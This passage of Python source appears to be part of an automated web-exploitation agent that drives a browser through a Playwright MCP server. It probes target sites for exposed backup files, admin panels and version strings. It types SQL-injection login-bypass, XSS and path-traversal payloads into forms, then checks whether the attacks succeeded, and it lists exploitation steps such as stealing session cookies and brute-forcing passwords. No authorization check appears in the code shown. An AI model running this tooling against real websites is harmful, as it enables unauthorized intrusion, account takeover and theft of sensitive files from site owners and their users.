            form_data['potential_vulnerabilities'].append('Search Form (XSS/SQLi)')
        
        if any(name in ['comment', 'message', 'feedback', 'content'] for name in input_names):
            form_data['potential_vulnerabilities'].append('User Input Form (XSS/SQLi)')
        
        forms.append(form_data)
    
    print(json.dumps(forms))
    
except Exception as e:
    print(json.dumps([{{"error": str(e)}}]))
"""

            result = await self.execute_python_exploit(
                form_discovery_code, url, packages=["requests", "beautifulsoup4"]
            )
            if result.get("success") and result.get("output"):
                try:
                    return json.loads(result["output"].strip())
                except json.JSONDecodeError:
                    return []
            return []

        except Exception as e:
            return [{"error": f"Form discovery failed: {str(e)}"}]

    async def _test_common_vulnerabilities(self, url: str) -> List[Dict]:
        """Test for common web vulnerabilities using automated checks."""
        try:
            vuln_testing_code = f"""
import requests
import json
import re
from urllib.parse import urljoin, urlparse

base_url = target_url
vulnerabilities = []

try:
    response = requests.get(base_url, timeout=10)
    content = response.text.lower()
    headers = response.headers
    
    # 1. Check for information disclosure
    if 'php' in content and ('error' in content or 'warning' in content):
        vulnerabilities.append({{
            'type': 'Information Disclosure',
            'severity': 'Medium',
            'description': 'PHP errors/warnings visible in response',
            'evidence': 'PHP error messages found in page content'
        }})
    
    if 'index of /' in content or 'parent directory' in content:
        vulnerabilities.append({{
            'type': 'Directory Listing',
            'severity': 'Low',
            'description': 'Directory listing enabled',
            'evidence': 'Directory listing indicators found'
        }})
    
    security_headers = ['x-frame-options', 'x-content-type-options', 'x-xss-protection', 'strict-transport-security']
    missing_headers = [header for header in security_headers if header not in headers]
    if missing_headers:
        vulnerabilities.append({{
            'type': 'Missing Security Headers',
            'severity': 'Low',
            'description': f'Missing security headers: {{", ".join(missing_headers)}}',
            'evidence': f'Headers not present: {{missing_headers}}'
        }})
    
    try:
        options_response = requests.options(base_url, timeout=5)
        if 'allow' in options_response.headers:
            allowed_methods = options_response.headers['allow'].upper()
            dangerous_methods = ['PUT', 'DELETE', 'TRACE', 'CONNECT']
            found_dangerous = [method for method in dangerous_methods if method in allowed_methods]
            if found_dangerous:
                vulnerabilities.append({{
                    'type': 'Dangerous HTTP Methods',
                    'severity': 'Medium',
                    'description': f'Dangerous HTTP methods enabled: {{", ".join(found_dangerous)}}',
                    'evidence': f'Allow header: {{allowed_methods}}'
                }})
    except:
        pass
    
    backup_files = ['backup.zip', 'backup.sql', 'database.sql', 'config.bak', 'wp-config.php.bak']
    for backup_file in backup_files:
        try:
            backup_url = urljoin(base_url, backup_file)
            backup_response = requests.get(backup_url, timeout=5)
            if backup_response.status_code == 200:
                vulnerabilities.append({{
                    'type': 'Sensitive File Exposure',
                    'severity': 'High',
                    'description': f'Backup file accessible: {{backup_file}}',
                    'evidence': f'File found at: {{backup_url}}'
                }})
        except:
            continue
    
    admin_paths = ['/admin', '/administrator', '/wp-admin', '/phpmyadmin', '/admin.php']
    for admin_path in admin_paths:
        try:
            admin_url = urljoin(base_url, admin_path)
            admin_response = requests.get(admin_url, timeout=5, allow_redirects=False)
            if admin_response.status_code in [200, 301, 302]:
                vulnerabilities.append({{
                    'type': 'Admin Interface Exposed',
                    'severity': 'Medium',
                    'description': f'Admin interface found: {{admin_path}}',
                    'evidence': f'Admin panel accessible at: {{admin_url}}'
                }})
        except:
            continue
    
    # 7. Check for version disclosure
    version_patterns = [
        (r'wordpress ([0-9.]+)', 'WordPress'),
        (r'drupal ([0-9.]+)', 'Drupal'),
        (r'joomla! ([0-9.]+)', 'Joomla'),
        (r'apache/([0-9.]+)', 'Apache'),
        (r'nginx/([0-9.]+)', 'Nginx')
    ]
    
    full_content = response.text + str(headers)
    for pattern, software in version_patterns:
        match = re.search(pattern, full_content, re.IGNORECASE)
        if match:
            vulnerabilities.append({{
                'type': 'Version Disclosure',
                'severity': 'Low',
                'description': f'{{software}} version disclosed: {{match.group(1)}}',
                'evidence': f'Version string found: {{match.group(0)}}'
            }})
    
    print(json.dumps(vulnerabilities))
    
except Exception as e:
    print(json.dumps([{{"error": str(e)}}]))
"""

            result = await self.execute_python_exploit(
                vuln_testing_code, url, packages=["requests"]
            )
            if result.get("success") and result.get("output"):
                try:
                    return json.loads(result["output"].strip())
                except json.JSONDecodeError:
                    return []
            return []

        except Exception as e:
            return [{"error": f"Vulnerability testing failed: {str(e)}"}]

    async def _find_login_pages(self, url: str) -> List[str]:
        """Find login pages."""
        return [f"{url}/login", f"{url}/admin", f"{url}/wp-admin"]

    async def _test_session_management(self, url: str) -> Dict:
        """Test session management."""
        return {}

    async def _test_sql_auth_bypass(self, login_url: str) -> Dict:
        """Test SQL injection authentication bypass."""
        return {"success": False}

    async def _test_default_credentials(self, login_url: str) -> Dict:
        """Test default credentials."""
        return {"success": False}

    async def _test_session_fixation(self, login_url: str) -> Dict:
        """Test session fixation."""
        return {"success": False}

    def _generate_exploitation_recommendations(
        self, prioritized_findings: List[Dict]
    ) -> List[Dict]:
        """
        Generate exploitation recommendations based on prioritized findings.

        Args:
            prioritized_findings: List of vulnerability findings sorted by priority

        Returns:
            List of exploitation recommendations
        """
        recommendations = []

        for finding in prioritized_findings:
            vuln_type = finding.get("type")
            severity = finding.get("severity")

            if vuln_type == "sql_injection":
                recommendations.append(
                    {
                        "vulnerability": "SQL Injection",
                        "priority": "CRITICAL",
                        "exploitation_steps": [
                            "1. Identify injectable parameters using automated tools",
                            "2. Test for different SQL injection types (Union, Boolean, Time-based)",
                            "3. Extract database schema and sensitive data",
                            "4. Attempt privilege escalation if possible",
                        ],
                        "tools": ["sqlmap", "custom Python scripts", "Burp Suite"],
                        "impact": "Complete database compromise possible",
                    }
                )

            elif vuln_type == "authentication":
                recommendations.append(
                    {
                        "vulnerability": "Authentication Bypass",
                        "priority": "CRITICAL",
                        "exploitation_steps": [
                            "1. Test for default credentials",
                            "2. Attempt SQL injection in login forms",
                            "3. Test for authentication logic flaws",
                            "4. Brute force weak passwords if rate limiting absent",
                        ],
                        "tools": [
                            "hydra",
                            "custom authentication scripts",
                            "Burp Suite",
                        ],
                        "impact": "Unauthorized access to user accounts",
                    }
                )

            elif vuln_type == "file_inclusion":
                recommendations.append(
                    {
                        "vulnerability": "File Inclusion",
                        "priority": "HIGH",
                        "exploitation_steps": [
                            "1. Test for Local File Inclusion (LFI)",
                            "2. Attempt to read sensitive files (/etc/passwd, config files)",
                            "3. Test for Remote File Inclusion (RFI)",
                            "4. Attempt code execution via log poisoning or file upload",
                        ],
                        "tools": [
                            "custom Python scripts",
                            "LFI wordlists",
                            "file inclusion payloads",
                        ],
                        "impact": "File system access and potential RCE",
                    }
                )

            elif vuln_type == "xss":
                recommendations.append(
                    {
                        "vulnerability": "Cross-Site Scripting",
                        "priority": "MEDIUM",
                        "exploitation_steps": [
                            "1. Identify XSS injection points",
                            "2. Test for stored vs reflected XSS",
                            "3. Craft payloads to steal session cookies",
                            "4. Attempt to escalate to account takeover",
                        ],
                        "tools": [
                            "XSS payloads",
                            "BeEF framework",
                            "custom JavaScript",
                        ],
                        "impact": "Session hijacking and client-side attacks",
                    }
                )

        return recommendations

    async def setup_playwright_mcp(self) -> Dict:
        """Setup MCP Playwright server for browser automation."""
        try:
            from .mcp_server_manager import McpServerManager

            if not self.mcp_server_manager:
                self.mcp_server_manager = McpServerManager()

            setup_result = await self.mcp_server_manager.auto_setup_mcp_server(
                "playwright-mcp", "https://github.com/microsoft/playwright-mcp"
            )

            if setup_result.get("success"):
                self.playwright_mcp_available = True
                return {"success": True, "message": "Playwright MCP server ready"}
            else:
                return {"success": False, "error": setup_result.get("error")}

        except Exception as e:
            return {"success": False, "error": str(e)}

    async def browser_exploit(
        self, target_url: str, exploit_actions: List[Dict]
    ) -> Dict:
        """
        Execute browser-based exploitation using MCP Playwright tools.

        Args:
            target_url: Target URL to exploit
            exploit_actions: List of browser actions like [{"action": "click", "selector": "#login"}, ...]

        Returns:
            Dict containing exploitation results
        """
        try:
            if not self.playwright_mcp_available:
                setup_result = await self.setup_playwright_mcp()
                if not setup_result.get("success"):
                    return setup_result

            # Use MCP tools for browser automation
            results = []

            nav_result = await self.call_mcp_tool(
                "browser_navigate", {"url": target_url}
            )
            results.append({"action": "navigate", "result": nav_result})

            for action in exploit_actions:
                if action["action"] == "click":
                    result = await self.call_mcp_tool(
                        "browser_click", {"selector": action["selector"]}
                    )
                elif action["action"] == "type":
                    result = await self.call_mcp_tool(
                        "browser_type",
                        {"selector": action["selector"], "text": action["text"]},
                    )
                elif action["action"] == "screenshot":
                    result = await self.call_mcp_tool("browser_screenshot", {})
                elif action["action"] == "get_page_content":
                    result = await self.call_mcp_tool("browser_get_content", {})
                elif action["action"] == "wait":
                    result = await self.call_mcp_tool(
                        "browser_wait", {"timeout": action.get("timeout", 5000)}
                    )
                else:
                    result = {
                        "success": False,
                        "error": f"Unknown action: {action['action']}",
                    }

                results.append({"action": action["action"], "result": result})

            return {
                "success": True,
                "results": results,
                "target_url": target_url,
                "total_actions": len(exploit_actions) + 1,  # +1 for navigation
            }

        except Exception as e:
            return {"success": False, "error": str(e)}

    async def call_mcp_tool(self, tool_name: str, params: Dict) -> Dict:
        """Call MCP tool through Agno framework."""
        try:
            result = await self.run_tool(tool_name, params)
            return {"success": True, "result": result}
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def automated_web_exploitation(
        self, target_url: str, vulnerability_type: str
    ) -> Dict:
        """
        Perform automated web exploitation using browser automation.

        Args:
            target_url: Target URL to exploit
            vulnerability_type: Type of vulnerability to exploit (sql_injection, xss, etc.)

        Returns:
            Dict containing exploitation results
        """
        try:
            if vulnerability_type == "sql_injection":
                # SQL injection exploitation using browser automation
                exploit_actions = [
                    {"action": "screenshot"},
                    {
                        "action": "type",
                        "selector": "input[name='username']",
                        "text": "admin' OR '1'='1",
                    },
                    {
                        "action": "type",
                        "selector": "input[name='password']",
                        "text": "password",
                    },
                    {"action": "click", "selector": "input[type='submit']"},
                    {"action": "wait", "timeout": 3000},
                    {"action": "screenshot"},
                    {"action": "get_page_content"},
                ]

            elif vulnerability_type == "xss":
                # XSS exploitation using browser automation
                exploit_actions = [
                    {"action": "screenshot"},
                    {
                        "action": "type",
                        "selector": "input[name='search']",
                        "text": "<script>alert('XSS')</script>",
                    },
                    {"action": "click", "selector": "input[type='submit']"},
                    {"action": "wait", "timeout": 2000},
                    {"action": "screenshot"},
                    {"action": "get_page_content"},
                ]

            elif vulnerability_type == "file_inclusion":
                # File inclusion exploitation using browser automation
                exploit_actions = [
                    {"action": "screenshot"},
                    {
                        "action": "type",
                        "selector": "input[name='file']",
                        "text": "../../../../etc/passwd",
                    },
                    {"action": "click", "selector": "input[type='submit']"},
                    {"action": "wait", "timeout": 3000},
                    {"action": "screenshot"},
                    {"action": "get_page_content"},
                ]

            else:
                return {
                    "success": False,
                    "error": f"Unsupported vulnerability type: {vulnerability_type}",
                }

            result = await self.browser_exploit(target_url, exploit_actions)

            if result.get("success"):
                exploitation_success = self._analyze_exploitation_results(
                    result, vulnerability_type
                )
                result["exploitation_analysis"] = exploitation_success

            return result

        except Exception as e:
            return {"success": False, "error": str(e)}

    def _analyze_exploitation_results(
        self, browser_results: Dict, vulnerability_type: str
    ) -> Dict:
        """
        Analyze browser exploitation results to determine success.

        Args:
            browser_results: Results from browser exploitation
            vulnerability_type: Type of vulnerability exploited

        Returns:
            Dict containing analysis results
        """
        try:
            analysis = {
                "exploitation_successful": False,
                "indicators": [],
                "evidence": [],
            }

            for action_result in browser_results.get("results", []):
                result_data = action_result.get("result", {})

                if vulnerability_type == "sql_injection":
                    if "result" in result_data:
                        content = str(result_data.get("result", "")).lower()
                        if any(
                            indicator in content
                            for indicator in [
                                "welcome",
                                "dashboard",
                                "admin panel",
                                "logged in",
                            ]
                        ):
                            analysis["exploitation_successful"] = True
                            analysis["indicators"].append(
                                "Successful authentication bypass"
                            )

                elif vulnerability_type == "xss":
                    if "result" in result_data:
                        content = str(result_data.get("result", ""))
                        if "<script>" in content or "alert(" in content:
                            analysis["exploitation_successful"] = True
                            analysis["indicators"].append(
                                "XSS payload reflected in response"
                            )

                elif vulnerability_type == "file_inclusion":
                    if "result" in result_data:
                        content = str(result_data.get("result", ""))
                        if any(
                            indicator in content
                            for indicator in [
                                "root:",
                                "/bin/bash",
                                "daemon:",
                                "www-data:",
                            ]
                        ):
                            analysis["exploitation_successful"] = True
                            analysis["indicators"].append(
                                "Sensitive file content disclosed"
                            )

            return analysis

        except Exception as e:
            return {
                "exploitation_successful": False,
                "error": f"Analysis failed: {str(e)}",
            }
